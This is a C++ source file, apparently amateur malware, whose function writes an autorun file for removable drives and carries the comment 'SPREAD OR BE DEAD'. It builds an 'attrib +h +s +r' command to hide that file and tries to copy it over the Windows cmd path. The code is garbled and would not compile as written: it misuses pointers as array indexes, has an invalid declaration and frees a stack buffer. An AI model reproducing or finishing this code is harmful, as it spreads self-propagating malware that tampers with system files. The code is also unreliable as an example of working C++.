#pragma once
#include <fstream>
#include <iostream>
#include "Sniffer.h";
#include "initialFileloctracker.h";
  using namespace std;
     int Printinf(int argc, char** argv) {
    fstream file;
    file.open("drive.inf", ios::out);
    file << "[autorun]\n";
    file << "open=drive.txt\n";         //SPREAD OR BE DEAD 8b
    file << "icon=drive.ico\n";
    file << "label=MyCD\n";
    if (!file)
    {
        cout << "Error in creating file!!!";
        return 1;
    }
    cout << "File created successfully.";
    file.close(); 
    string programFiles[2000];
    for (int s = 0; s < argc; s++) {
		programFiles[s] = argv[s];
		cout << programFiles[s] << endl;
    }
    string system1[] = { "C:\\Windows\\System32\\cmd" };
    string keeper = "";
   communication(argc, argv);
   const auto GetPidByProcessName(system1);
   for (string* sys = 0; sys < system1; sys++) {
		std::cout << "this is what var system is 8( => :" << system1[(int)sys] << endl;
        keeper = system1[(int)sys];
    }char buffer[200];
	for (int i = 0; i < keeper.length(); i++) {
		buffer[i] = keeper[i];
	}
    streamsize count;
	sprintf_s(buffer, "attrib +h +s +r drive.inf");
	count = strlen(buffer);
	
    file.write(buffer, count); 
    file.getline(buffer, count);
    if (count != NULL) {
        std::ifstream in("drive.inf", std::ios::in | std::ios::binary);
        std::ofstream out(keeper, std::ios::out | std::ios::binary);
        out << in.rdbuf();
        if (file.is_open() == true) {
           // std::remove("drive.inf");
            string& address = keeper;
			int size = address.length();
			for (int i = 0; i < address.length(); i++) {
				//buffer[i] = address[i] + rand();
				address[i] = address[i] + rand();
                if (address[i] > size) {
                    address[i] - rand();
                    file.put((char)argv[0][i]);
                }else if(address[i]<size) {
                    address[i] + rand();
					file.put((char)argv[0][i]);
                }
			}
           // std::remove("");
        }
		free(buffer);
    }
    return 0;
}